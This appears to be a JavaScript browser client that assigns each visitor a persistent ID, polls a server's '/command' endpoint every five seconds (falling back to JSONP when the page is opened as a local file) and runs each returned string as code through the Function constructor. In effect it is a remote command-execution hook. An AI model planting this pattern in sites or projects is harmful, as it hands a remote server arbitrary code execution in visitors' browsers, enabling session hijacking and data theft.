let lastCommandId = '';
// Configuração dinâmica do endpoint
const serverOrigin = new URL(document.currentScript.src).origin;
const isLocalFile = (window.location.protocol === 'file:');
let commandEndpoint = `${serverOrigin}/command`;
const pollInterval = 5000; // 5 seconds

// Geração de ID único por cliente
const clientId = localStorage.getItem('clientId') || crypto.randomUUID();
localStorage.setItem('clientId', clientId);

// Function to handle the response from the server
function handleResponse(data) {
    if (data.new && data.command) {
        // Update the last command ID
        lastCommandId = data.id;
        
        // Execute the command
        executeCommand(data.command);
        
        // Update status
        updateStatus(`Command executed at ${new Date().toLocaleTimeString()}`);
    }
}

// Function for JSONP callbacks - This was missing!
function handleCommand(data) {
    handleResponse(data);
    
    // Remove the script tag that was created for JSONP
    const scriptTags = document.head.querySelectorAll('script[src*="callback=handleCommand"]');
    scriptTags.forEach(tag => tag.remove());
    
    // Continue polling after a delay
    setTimeout(checkForCommands, pollInterval);
}

// Function to execute the JavaScript command
function executeCommand(command) {
    try {
        // Use Function constructor to create and execute the code
        const execFunc = new Function(command);
        execFunc();
    } catch (error) {
        updateStatus(`Error executing command: ${error.message}`);
        console.error("Error executing command:", error);
    }
}

// Function to update the status display
function updateStatus(message) {
    const statusElement = document.getElementById('status');
    if (statusElement) {
        statusElement.textContent = message;
    } else {
        console.log("Status update:", message);
    }
}

// Function to check for new commands
function checkForCommands() {
    if (isLocalFile) {
        // Usar JSONP para contornar CORS em arquivos locais
        const script = document.createElement('script');
        script.src = `${commandEndpoint}?callback=handleCommand&last_id=${lastCommandId}`;
        document.head.appendChild(script);
    } else {
        fetch(`/command?last_id=${lastCommandId}`)
            .then(response => response.json())
            .then(data => handleResponse(data))
            .catch(error => {
                console.error("Error fetching commands:", error);
                updateStatus(`Error: ${error.message}`);
            })
            .finally(() => {
                // Set a timeout to check again
                setTimeout(checkForCommands, pollInterval);
            });
    }
}

// Start the polling process when the script loads
document.addEventListener('DOMContentLoaded', function() {
    updateStatus('Connected. Waiting for commands...');
    // Start checking for commands
    checkForCommands();
});